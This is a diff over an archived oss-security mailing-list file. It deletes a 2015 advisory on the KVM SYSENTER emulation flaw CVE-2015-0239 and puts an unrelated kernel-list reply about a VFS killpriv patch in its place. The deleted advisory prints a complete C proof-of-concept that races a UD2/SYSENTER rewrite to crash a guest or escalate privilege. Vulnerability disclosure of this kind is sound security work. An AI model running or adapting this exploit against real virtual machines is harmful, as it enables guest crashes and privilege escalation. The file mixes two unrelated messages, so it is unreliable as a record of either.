@@ -1,170 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/27/6
-Message-Id: <37E51B35-53A2-4A96-8D93-C3E1C936F6E7@gmail.com>
-Date: Tue, 27 Jan 2015 14:17:22 +0200
-From: Nadav Amit <nadav.amit@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: Red Hat Product Security <secalert@...hat.com>, Paolo Bonzini <pbonzini@...hat.com>
-Subject: KVM SYSENTER emulation vulnerability - CVE-2015-0239
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/21/12
+Message-ID: <54BFD090.4000907@schaufler-ca.com>
+Date: Wed, 21 Jan 2015 08:15:12 -0800
+From: Casey Schaufler <casey@...aufler-ca.com>
+To: Stephen Smalley <sds@...ho.nsa.gov>, James Morris <jmorris@...ei.org>, Ben Hutchings <ben@...adent.org.uk>
+CC: Alexander Viro <viro@...iv.linux.org.uk>, linux-fsdevel@...r.kernel.org, linux-security-module@...r.kernel.org, LKML <linux-kernel@...r.kernel.org>, 770492@...s.debian.org, Ben Harris <bjh21@....ac.uk>, oss-security@...ts.openwall.com, John Johansen <john.johansen@...onical.com>, Paul Moore <paul@...l-moore.com>, Casey Schaufler <casey@...aufler-ca.com>
+Subject: Re: [RFC PATCH RESEND] vfs: Move security_inode_killpriv() after permission checks
 Content-Type: text/plain; charset=utf-8
 
-Linux 2.6.32 - 3.18 that runs KVM may enable a malicious guest process to
-crash the guest OS or launch a privilege escalation attack on the guest. The
-attack can be launched by tricking the hypervisor to emulate a SYSENTER
-instruction in 16-bit mode, if the guest OS does not initialize the SYSENTER
-MSRs. KVM does not check under these conditions that the selector
-IA32_SYSENTER_CS is not zero, and does not generate a #GP exception as real
-hardware does. Instead, it sets the guest instruction pointer to zero and
-changes the code privilege level (CPL) to zero (privileged). Note that the
-attack can only be issued under very certain conditions (see the details
-below). Windows and distro Linux guest OSes should be safe.
+On 1/21/2015 6:03 AM, Stephen Smalley wrote:
+> On 01/20/2015 06:17 PM, James Morris wrote:
+>> On Sat, 17 Jan 2015, Ben Hutchings wrote:
+>>
+>>> chown() and write() should clear all privilege attributes on
+>>> a file - setuid, setgid, setcap and any other extended
+>>> privilege attributes.
+>>>
+>>> However, any attributes beyond setuid and setgid are managed by the
+>>> LSM and not directly by the filesystem, so they cannot be set along
+>>> with the other attributes.
+>>>
+>>> Currently we call security_inode_killpriv() in notify_change(),
+>>> but in case of a chown() this is too early - we have not called
+>>> inode_change_ok() or made any filesystem-specific permission/sanity
+>>> checks.
+>>>
+>>> Add a new function setattr_killpriv() which calls
+>>> security_inode_killpriv() if necessary, and change the setattr()
+>>> implementation to call this in each filesystem that supports xattrs.
+>>> This assumes that extended privilege attributes are always stored in
+>>> xattrs.
+>> It'd be useful to get some input from LSM module maintainers on this. 
+>>
+>> e.g. doesn't SELinux already handle this via policy directives?
+> There have been a couple postings of a similar patch set [1] by Jan
+> Kara, although I don't believe that series addressed chown().
+>
+> If I am reading the patches correctly, they (correctly) don't affect
+> SELinux or Smack labels; they are just calling the existing
+> security_inode_killpriv() hook, which is only implemented for the
+> capability module to remove the security.capability xattr.
 
-The bug existed since the introduction of SYSENTER emulation (em_sysenter
-function on recent Linux releases), in commit
-8c60435261deaefeb53ce3222d04d7d5bea81296 , which is present in Linux 2.6.32
-- 3.18.
+The description of the change should say that. I can easily
+imagine an enthusiastic test developer reading the existing
+description and filing bugs because SELinux, Smack and whatever
+other xattr based systems might be around don't clear their
+attributes. If the intent wasn't clear to the first person to
+use xattrs for security purposes, I shouldn't expect the new
+and inexperienced to see it.
 
-To fix the bug, you can apply the following patch -
-http://permalink.gmane.org/gmane.linux.kernel.commits.head/502245
+My position softens. Document it correctly, and I'm fine with it.
 
-There are no known exploits of the vulnerability. Red-hat assigned
-CVE-2015-0239 for this vulnerability.
-
-
-Details:
-
-The success of such an attack and its results depend on the guest OS. It is
-inapplicable if the guest OS initializes the SYSENTER MSRs, as Linux usually
-does. If the MSRs were not initialized, it can be used to crash the guest OS
-or for privilege escalation. However, it cannot be used for privilege
-escalation if the guest cannot access the first memory page, whose virtual
-address is zero.
-
-As a result of these limitations the attack is only possible in when the
-guest uses certain OSes, for instance, Linux which was built without
-CONFIG_IA32_EMULATION (support for legacy 32-bit programs) or FreeBSD. In
-these systems, guest DoS is possible. Privilege escalation attack requires
-that in addition guest processes would be able to access address zero. For
-Linux guest, this requirement means the the kernel parameter
-vm.mmap_min_addr is set to zero.
-
-An attack can be launched on an SMP guest, using guest code that tricks KVM
-into emulating the SYSENTER instruction. The attached PoC does just that. It
-first writes a UD2 instruction, causing a #UD exception and a subsequent
-VM-exit, and then tries from another thread to rewrite the UD2 instruction
-with SYSENTER just before KVM emulates the instruction. The PoC is not fully
-automatic since dealing with signals in 16-bit code is annoying. The PoC
-therefore takes an argument that tells it how many cycles to wait before
-creating the race that fools the hypervisor into emulating a SYSENTER
-instruction. On my system, using 100 as an input results produces the
-exploit.  Using the PoC I manages to crash the
-guest Linux kernel, causing a double fault; and to demonstrate privilege
-escalation by successfully executing “int $2” that caused spurious NMI.
-
-Regardless to SMP, it appears that an attack can also
-be launched on UP, if the guest is configured to run on Intel VCPU while the
-real CPU is AMD. AMD CPUs do not support SYSENTER in compatibility mode; KVM
-would emulate them so the VCPU would behave as if the physical CPU is Intel.
-This is likely to trigger the vulnerability.
-
-
-
-—
-
-// KVM SYSENTER EXPLOIT 
-
-// Some of the code of the PoC was borrowed from code that was written by
-// Andy Lutomirski for another vulnerability.
-
-#include <pthread.h>
-#include <err.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <setjmp.h>
-#include <string.h>
-#include <stdbool.h>
-#include <sys/io.h>
-#include <asm/ldt.h>
-#include <sys/types.h>
-#include <sys/mman.h>
-
-//#define MMAP_EXPLOIT
-
-asm (	".pushsection .wtext, \"awx\"\n"
-	"cs16ip1: \n\t"
-	".int 0\n\t"
-	".byte 0xf, 0\n\t"  
-	"entry1:\n\t"
-	"ljmp *(cs16ip1)\n\t"
-     	"badcode:\n\t"
-	".code16\n\t"
-     	"ud2\n\t"
-	"jmp badcode\n\t"
-	".code64\n\t"
-     	".popsection\n\t");
-
-volatile int sync = 0;
-
-extern volatile unsigned short badcode[];
-extern volatile void *entry1;
-
-int wait_cycles;
-
-static void *proc(void *ignored)
-{
-	sync = 1;
-	while (true) {
-		volatile int cycles;
-		badcode[0] = 0x340f; // sysenter
-		asm volatile ("clflush (%0)\n\t" : : "r"(badcode));
-		for (cycles = 0; cycles < wait_cycles; cycles++);
-	}
-	return NULL;
-}
-
-int main(int argc, char *argv[])
-{
-	int res;
-	void *mem;
-	pthread_t pth;
-	struct user_desc d = {
-		.entry_number = 1,
-		.base_addr = (unsigned long)&badcode,
-		.limit = 0xfffffu,
-		.seg_32bit = 0, 
-		.contents = 2,
-		.read_exec_only = 0,
-		.limit_in_pages = 1,
-		.seg_not_present = 0,
-		.useable = 0,
-	};
-	if (argc < 2) {
-		printf("usage: ./sysenter [cycles]\n"); // 100 cycles works for me
-		exit(-1);
-	}
-	wait_cycles = atoi(argv[1]);
-#if MMAP_EXPLOIT
-	mem = mmap(NULL, 4096, PROT_EXEC | PROT_READ | PROT_WRITE,
-                       MAP_ANON | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED, -1, 0);
-	if (mem != NULL) {
-		printf("Problem setting mmap to NULL\n");
-		exit(-1);
-	}
-	*(unsigned short *)mem = 0x02cd; // int $2
-#endif
-	res = modify_ldt(1, &d, sizeof(d));
-	if (res != 0) {
-		printf("Problem setting LDT entry\n");
-		exit(-1);
-	}
-
-	pthread_create(&pth, NULL, proc, NULL);
-	while (!sync);
-	badcode[0] = 0x0b0f; // ud2
-	asm volatile ("call entry1" : : : "flags");
-	return 0;
-}
-
+>
+> [1] http://marc.info/?l=linux-security-module&m=141890696325054&w=2
+>
 
